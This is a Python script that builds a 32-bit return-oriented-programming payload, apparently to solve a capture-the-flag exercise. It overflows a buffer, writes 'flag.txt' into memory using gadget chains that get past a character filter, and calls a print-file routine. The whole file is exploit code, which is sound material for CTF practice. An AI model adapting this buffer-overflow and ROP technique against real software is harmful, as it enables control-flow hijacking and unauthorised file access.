#!/usr/bin/python3

WORD = 4

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, WORD)
PACKS = lambda s: bytes(s + (((len(s) & ~(WORD - 1) - 1) + WORD) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

DATA = 0x0804a018
PRINT_FILE = 0x8048538
POP_ESI_EDI_EBP = 0x80485b9
MOV_ESI_TO_EDI = 0x0804854f

ADD_AT_EBP_BL = 0x08048543

POP_EBP = 0x80485bb
POP_EBX = 0x80485d6

rop = b" " * 44
rop += PACKP(POP_ESI_EDI_EBP) + PACKS("flag") + PACKP(DATA) + PACKP(0)
rop += PACKP(MOV_ESI_TO_EDI)
rop += PACKP(POP_ESI_EDI_EBP) + PACKS(".txt") + PACKP(DATA + 4) + PACKP(0)
rop += PACKP(MOV_ESI_TO_EDI)

#TODO fix characters

rop += PACKP(POP_EBP) + PACKP(DATA + 2) + PACKP(POP_EBX) + PACKP(ord('a') - 0xeb + 0x100) + PACKP(ADD_AT_EBP_BL)
rop += PACKP(POP_EBP) + PACKP(DATA + 3) + PACKP(POP_EBX) + PACKP(ord('g') - 0xeb + 0x100) + PACKP(ADD_AT_EBP_BL)
rop += PACKP(POP_EBP) + PACKP(DATA + 4) + PACKP(POP_EBX) + PACKP(ord('.') - 0xeb + 0x100) + PACKP(ADD_AT_EBP_BL)
rop += PACKP(POP_EBP) + PACKP(DATA + 6) + PACKP(POP_EBX) + PACKP(ord('x') - 0xeb + 0x100) + PACKP(ADD_AT_EBP_BL)

rop += PACKP(PRINT_FILE)
rop += PACKP(DATA)

echo(rop)

